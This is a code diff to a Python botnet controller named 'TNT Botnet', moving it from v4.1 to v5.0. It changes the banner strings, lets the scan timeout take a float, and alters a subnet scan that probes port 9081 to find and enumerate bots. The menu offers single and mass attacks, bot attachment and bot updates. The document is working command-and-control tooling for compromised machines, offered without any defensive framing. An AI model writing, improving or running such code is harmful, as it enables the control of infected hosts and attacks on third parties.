@@ -83,7 +83,7 @@ if platform.system() == "Windows":
         "mass_shell": "commander@botnet > ",
         "bye": "Thanks for using this tool!",
         "cmds": "[1] View loaded bots\n[2] Attack one bot\n[3] Mass Attack\n[4] Attach the bot\n[5] Update bot\n[6] Avaliable commands\n[7] Scan bots in network\n[8] Empty bot list",
-        "Greetings": "Bot Controller For TNT Botnet v4.1",
+        "Greetings": "Bot Controller For TNT Botnet v5.0",
         "Answer_from_bot": "[*] Bot sent answer:\n",
         "require_option": "[?] This commandlet requires an option: ",
         "proc1": "[*] Searching for bases...",
@@ -106,7 +106,7 @@ if platform.system() == "Linux":
 \u001b[39m[\u001b[36m7\u001b[39m] Scan bots in network
 \u001b[39m[\u001b[36m8\u001b[39m] Empty bot list
 ''',
-        "Greetings": "\u001b[31mBot Controller For TNT Botnet \u001b[31mv4.1\u001b[39m\n\n\n",
+        "Greetings": "\u001b[31mBot Controller For TNT Botnet \u001b[31mv5.0\u001b[39m\n\n\n",
         "Answer_from_bot": "\u001b[39m[\u001b[92m*\u001b[39m]\u001b[32m Bot sent answer:\u001b[39m\n",
         "require_option": "\u001b[39m[\u001b[33m?\u001b[39m]\u001b[93m This commandlet requires an option:\u001b[39m ",
         "proc1": "\u001b[39m[\u001b[33m*\u001b[39m]\u001b[33m Searching for bases...",
@@ -223,14 +223,14 @@ try:
             if to == "":
                 to = 0.2
             else:
-                to = int(to)
+                to = float(to)
             net = ipaddress.ip_network(f"{netip}/{subnet}")
             for i in net:
                 s = socket.socket()
                 s.settimeout(to)
                 code = s.connect_ex((str(i), 9081))
-                if code == 10035:
-                    print(f"[{str(i)}] [-]")
+                if code != 0:
+                    print(f"[{str(i)}] [-] code: {code}")
                 elif code == 0:
                     s.close()
                     print(f"\n[{str(i)}] [+] {GetInfoOfTheBot(str(i))}\n")
